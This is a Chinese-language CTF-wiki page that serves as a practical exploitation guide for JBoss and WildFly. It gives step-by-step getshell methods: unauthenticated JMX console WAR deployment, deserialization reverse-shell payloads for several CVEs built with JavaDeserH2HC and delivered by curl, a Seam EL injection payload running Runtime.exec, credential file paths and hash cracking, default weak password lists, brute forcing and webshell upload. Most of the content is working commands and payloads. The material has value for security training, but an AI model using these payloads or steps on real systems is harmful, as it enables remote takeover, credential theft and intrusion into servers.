# JBoss
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 



### JMX Console未授权访问Getshell

此漏洞主要是由于`JBoss`中`/jmx-console/HtmlAdaptor`路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到`jmx`控制台，并在其中执⾏任何功能。

### 漏洞利用

1、首先访问`http://10.211.55.7:8080/jmx-console/`然后找到`jboss.deployment`（jboss 自带的部署功能）中的`flavor=URL,type=DeploymentScanner`点进去（通过 url 的方式远程部署）

![image.png](jboss_getshell.assets/1592146888_5ee63bc84923c.png!small)

2、找到页面中的`void addURL()`选项来远程加载war包来部署。

![image.png](jboss_getshell.assets/1592146906_5ee63bda3ba4f.png!small)

3、点击`invoke`之后会提示部署成功,如下

![image.png](jboss_getshell.assets/1592146920_5ee63be83a538.png!small)

4、部署完成后回到`flavor=URL,type=DeploymentScanner`页面点击下属性列表中的"Apply change"

![image.png](jboss_getshell.assets/1592146928_5ee63bf0b87f9.png!small)

5、最后访问⽊⻢地址为`http://10.211.55.7:8080/bm1/index.jsp`

![image.png](jboss_getshell.assets/1592146940_5ee63bfcd9c17.png!small)

## 反序列化RCE漏洞

### JBosSAS 5.x,6.X 反序列化漏洞（CVE-2017-12149）

#### 漏洞描述

此漏洞主要是由于`jboss\server\all\deploy\httpha-invoker.sar\invoker.war\WEB-INF\classes\org\jboss\invocation\http\servlet`目录下的`ReadOnlyAccessFilter.class`文件中的`doFilter`方法，再将序列化传入`ois`中，并没有进行过滤便调用了`readObject()`进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。

#### 影响版本

JbossAS 5.x , JbossAS 6.x

#### 漏洞利用

1、首先从http响应头和title中一般情况下都能看到信息来确定目标 jboss 版本是否在此漏洞版本范围

![image.png](jboss_getshell.assets/1592147063_5ee63c77b3787.png!small)

2、确定目标的 jboss 是否存在此漏洞,直接访问 `poc url: http://192.168.3.81:8080/invoker/readonly` 如果出现报 500 错误,则说明目标机器可能存在此漏洞

![image.png](jboss_getshell.assets/1592147076_5ee63c84e4f89.png!small)

3、明确目标`jboss`可能存在此漏洞以后,接下来借助`JavaDeserH2HC`来完成整个利用过程

```
git clone https://github.com/joaomatosf/JavaDeserH2HC.git 
cd JavaDeserH2HC/
```

4、首先尝试直接反弹`shell`,利用`JavaDeserH2HC`创建好用于反弹`shell`的 payload,如下

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap vps的ip:端口 
```

4、然后尝试利用`curl`发送`payload`到目标机器上执行后，发现vps已成功接弹回的shell

```
curl http://www.target.net/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![image.png](jboss_getshell.assets/1592147096_5ee63c98aa9aa.png!small)

### JBOSSMQ JMS 集群反序列化漏洞（CVE-2017-7504）

#### 漏洞描述

`JBoss AS 4.x`及之前版本中，`JbossMQ`实现过程的`JMS over HTTP Invocation Layer`的`HTTPServerILServlet.java`⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。

#### 影响版本

`JBoss AS 4.x`及之前版本

#### 漏洞利用

1、首先验证目标`jboss`是否存在此漏洞,直接访问 

```
poc url : http://10.211.55.7:8080/jbossmq-httpil/HTTPServerILServlet/
```

2、如果返回以下内容,则说明目标的`jboss`可能存在此漏洞,而后继续尝试进一步利用即可
![image.png](jboss_getshell.assets/1592147108_5ee63ca4aae28.png!small)3、此处我们使用`JavaDeserH2HC`工具来利用该漏洞,尝试直接弹回一个目标系统的原生 `cmd shell`

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 10.211.55.16:53
curl http://10.211.55.7:8080/jbossmq-httpil/HTTPServerILServlet/ --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![image.png](jboss_getshell.assets/1592147117_5ee63cad54eb8.png!small)

### JBoss JMXInvokerServlet 反序列化漏洞 (CVE-2015-7501)

#### 漏洞描述

由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放，JBoss的`jmx`组件⽀持Java反序列化

#### 影响版本

实际上主要集中在 jboss 6.x 版本上:

```
 Apache Group Commons Collections 4.0 
 Apache Group Commons Collections 3.2.1 
 Apache Group Commons Collections
```

#### 漏洞利用

验证是否存在此漏洞,直接访问 

```
poc url: http://target/invoker/JMXInvokerServlet 
```

如果像下面一样直接提示下载,则说明目标可能存在此漏洞
![image.png](jboss_getshell.assets/1592147132_5ee63cbc1a637.png!small)

下面使用JavaDeserH2HC 生成反弹 shell 的 payload

```
# cd JavaDeserH2HC/
# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
# java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 公网vps的ip:端口号
# curl http://target/invoker/JMXInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

![image.png](jboss_getshell.assets/1592147142_5ee63cc69cac0.png!small)打开nc界⾯，发现shell已经弹回成功了。

### JBoss EJBInvokerServlet 反序列化漏洞（CVE-2013-4810）

#### 漏洞描述

此漏洞和`CVE-2015-7501`漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中`JMXInvokerServlet`和`EJBInvokerServlet`利用的是`org.jboss.invocation.MarshalledValue`进行的反序列化操作，而`web-console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造的文件。

#### 影响版本

实际上主要集中在 `jboss 6.x` 版本上:

```
 Apache Group Commons Collections 4.0 
 Apache Group Commons Collections 3.2.1 
 Apache Group Commons Collections
```

#### 漏洞利用

跟CVE-2015-7501利⽤⽅法⼀样，只是路径不⼀样，这个漏洞利⽤路径
是 `/invoker/EJBInvokerServlet`

## JBoss seam2模板注入

### CVE-2010-1871

#### 漏洞描述

`JBossSeam`是一个`JavaEE5`框架，把JSF与`EJB3.0`组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。`JBossSeam`处理某些参数化`JBossEL`表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的`JBossSeam`用户访问特制的网页，就可能导致执行任意代码。

#### 影响版本

Redhat Jboss_enterprise_application_platform:4.3.0 

#### 漏洞利用

1、此漏洞是通过`seam`组件中插入`#{payload}`进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法）,从而可以传入任何想要执行的命令。

```
/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23{}的#{}
```

2、POC如下，其中cmd代表传入的远程命令。在`/admin-console/login.seam`路径下，POST传入构造好的`payload`，即可对此漏洞利用。

```
actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('Java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('Java.lang.Runtime')).exec(cmd)}
```

## 其它漏洞与利用

### Jboss 7.x与WildFly控制台用户密码hash破解

搜集`jboss`中的所有密码,可以为后续内网横向移动提前做好准备
在7.x以下的版本，jboss用户密码通常默认都是直接明文保存在下面的文件中的

```
C:\Users\tale\Desktop\jboss-4.2.3.GA\server\default\conf\propsjmx-console-users.properties
```

![image.png](jboss_getshell.assets/1592147160_5ee63cd88e9da.png!small)

而高版本的`jboss`和`wildfly`通常都是加密保存在下面的文件中,默认密码加密格式为 
`HEX( MD5( username ':' realm ':' password))`

```
C:\services\wildfly-10.1.0.Final\standalone\configuration\mgmt-users.properties
```

`john`也对此算法支持,编号为`1591`，可以对其进行破解

```
# john --wordlist=password.list --format=dynamic_1591
```

### Jboss < 7.x默认管理控制台弱口令爆破

`jboss 6.x-7.x`版本的默认管理控制台入口,因此版本默认没有强制复杂密码策略,所以比较容易出现弱口令。
Jboss 的常见弱口令:

```
admin:admin
admin:jboss
admin:password1! 
jboss:admin 
admin:ezoffice
```

### Jboss > 7.x 和WildFly默认管理控制台弱口令爆破

`jboss`从8开始正式更名为`WildFly` ,在`WildFly8`之后的版本添加控制台用户时默认就会执行强密码策略,所以相对于之前低版本的`jboss`,针对`WildFly`之后版本的弱口令推荐`wildPwn`这款爆破工具

```
# git clone https://github.com/hlldz/wildPwn.git 
# cd wildPwn
# python wildPwn.py -m brute --target 192.168.3.108 --port 8080 -user userList.txt -pass passList.txt  
```

![image.png](jboss_getshell.assets/1592147170_5ee63ce283128.png!small)

### WildFly默认管理控制台部署webshell方法

1、通过账号密码登到 `wildlfy` 控制台页面后,找到 `Deployments` 选项,上传`war`包
![image.png](jboss_getshell.assets/1592147178_5ee63cea7d205.png!small)2、此处勾选启用`Enable`
![image.png](jboss_getshell.assets/1592147187_5ee63cf354f52.png!small)![image.png](jboss_getshell.assets/1592147194_5ee63cfa3de43.png!small)3、提示成功后会直接部署到`jboss`根目录下,访问`http://127.0.0.1:8080/cmd/cmd.jsp`
![image.png](jboss_getshell.assets/1592147208_5ee63d0802b06.png!small)4、访问木马webshell
![image.png](jboss_getshell.assets/1592147218_5ee63d12f1d25.png!small)
